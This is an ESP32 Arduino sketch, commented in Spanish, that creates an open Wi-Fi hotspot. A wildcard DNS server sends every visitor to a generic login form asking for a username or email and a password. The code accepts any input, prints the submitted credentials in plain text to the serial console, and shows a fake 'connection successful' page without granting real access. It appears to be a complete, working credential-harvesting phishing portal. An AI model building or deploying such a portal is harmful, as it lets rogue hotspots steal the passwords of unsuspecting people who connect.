#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// Configuración de la red Wi-Fi
const char* ssid = "Portal Cautivo ESP32";
const byte DNS_PORT = 53;          
IPAddress apIP(192, 168, 4, 1);    
DNSServer dnsServer;
WebServer server(80);

// Formulario de Inicio de Sesión
const char* login_page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión en la Red</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; text-align: center; padding: 50px 20px; margin: 0; }
        .container { max-width: 360px; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin: 0 auto; text-align: left; }
        h2 { color: #333; text-align: center; margin-bottom: 20px; }
        label { font-weight: bold; color: #555; display: block; margin-bottom: 5px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        input[type="submit"] { width: 100%; background-color: #007bff; color: white; padding: 12px; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
        input[type="submit"]:hover { background-color: #0056b3; }
        .info { font-size: 12px; color: #777; text-align: center; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Inicio de Sesión</h2>
        <!-- Formulario que envía los datos a /login mediante POST -->
        <form action="/login" method="POST">
            <label for="user">Usuario / Email:</label>
            <input type="text" id="user" name="usuario" placeholder="Ej. usuario123" required>
            
            <label for="pass">Contraseña:</label>
            <input type="password" id="pass" name="contrasena" placeholder="••••••••" required>
            
            <input type="submit" value="Acceder a la Red">
        </form>
        <div class="info">Se requiere autenticación para navegar.</div>
    </div>
</body>
</html>
)rawliteral";

// Pantalla de Inicio de Sesión Exitoso
const char* success_page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Concedido</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; text-align: center; padding: 50px 20px; margin: 0; }
        .container { max-width: 360px; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin: 0 auto; }
        .icon { font-size: 50px; color: #28a745; margin-bottom: 10px; }
        h2 { color: #28a745; margin-top: 0; }
        p { color: #555; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✓</div>
        <h2>¡Conexión Exitosa!</h2>
        <p>Tu inicio de sesión se ha registrado correctamente.</p>
        <p>Ya puedes cerrar esta ventana y comenzar a utilizar la red local.</p>
    </div>
</body>
</html>
)rawliteral";

// Muestra la página del formulario
void handleRoot() {
  server.send(200, "text/html", login_page);
}

// Procesa el formulario enviado (POST)
void handleLogin() {
  // Verificamos si llegaron los campos esperados del formulario
  if (server.hasArg("usuario") && server.hasArg("contrasena")) {
    String usuarioRecibido = server.arg("usuario");
    String claveRecibida = server.arg("contrasena");

    // Imprime las credenciales en el Monitor Serie (para simular el registro/recepción)
    Serial.println("\n--- Intento de Inicio de Sesión Detectado ---");
    Serial.print("Usuario enviado: "); Serial.println(usuarioRecibido);
    Serial.print("Clave enviada: "); Serial.println(claveRecibida);
    Serial.println("--------------------------------------------");
  }

  // Pantalla de éxito
  server.send(200, "text/html", success_page);
}

void setup() {
  Serial.begin(115200);
  Serial.println("\nIniciando Portal Cautivo con Login...");

  // Configurar Access Point
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);

  // Iniciar servidor DNS
  dnsServer.start(DNS_PORT, "*", apIP);

  // Rutas del Servidor Web
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin); // Maneja el envío de datos del formulario

  // Redirección forzada para cualquier otra ruta (Portal Cautivo)
  server.onNotFound([]() {
    server.send(200, "text/html", login_page);
  });

  server.begin();
  Serial.println("Servidor web listo.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}